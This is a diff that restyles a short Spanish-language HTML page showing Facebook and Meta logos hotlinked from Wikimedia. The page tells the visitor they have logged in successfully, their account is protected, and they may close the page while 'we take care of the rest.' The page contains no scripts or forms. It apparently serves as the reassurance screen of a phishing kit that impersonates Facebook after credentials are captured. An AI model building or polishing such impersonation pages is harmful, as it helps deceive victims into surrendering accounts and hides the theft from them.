@@ -1,13 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Éxito</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sesión Exitosa</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            text-align: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .facebook-logo {
+            width: 60px;
+            margin-top: 20px;
+        }
+        .mensaje {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 40px;
+            margin-bottom: 40px;
+        }
+        .meta-logo {
+            width: 90px;
+            margin-bottom: 10px;
+        }
+    </style>
 </head>
-<body style="text-align: center; font-family: Arial, sans-serif;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="60">
-    <h2>Listo, has iniciado sesión de forma correcta</h2>
-    <p>Tu cuenta está protegida, puedes salir ahora.</p>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Meta_Platforms_Inc._logo.svg" width="80">
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="facebook-logo">
+
+    <div class="mensaje">
+        Listo, has iniciado sesión de forma correcta,<br>
+        tu cuenta está protegida, puedes cerrar esta pagina nosotros nos encargaremos del resto.
+    </div>
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
 </body>
 </html>
